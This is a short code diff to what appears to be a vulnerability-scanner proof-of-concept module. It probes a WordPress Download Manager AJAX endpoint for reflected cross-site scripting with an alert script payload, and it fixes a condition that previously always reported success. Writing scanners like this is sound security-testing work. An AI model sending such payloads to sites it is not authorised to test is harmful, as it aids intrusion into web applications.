@@ -40,7 +40,7 @@ class Poc(ABPoc):
             payload = '/wp-admin/admin-ajax.php?action=wpdm_generate_password&id=%3C/script%3E%3Cscript%3Ealert(cscan)%3C/script%3E'
             url = self.target + payload
             r = requests.get(url)
-            if r.status_code == 200 and '</script><script>alert(cscan)</script>':
+            if r.status_code == 200 and '</script><script>alert(cscan)</script>' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
